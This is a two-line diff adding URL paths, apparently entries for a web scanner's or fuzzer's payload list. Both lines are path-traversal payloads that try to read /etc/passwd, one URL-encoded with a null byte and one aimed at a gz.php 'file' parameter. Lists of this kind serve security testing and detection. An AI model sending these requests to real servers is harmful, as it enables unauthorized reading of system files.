@@ -1,0 +1,2 @@
+/?action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+/includes/lib/gz.php?file=/themes/../../../../../../../../../etc/passwd
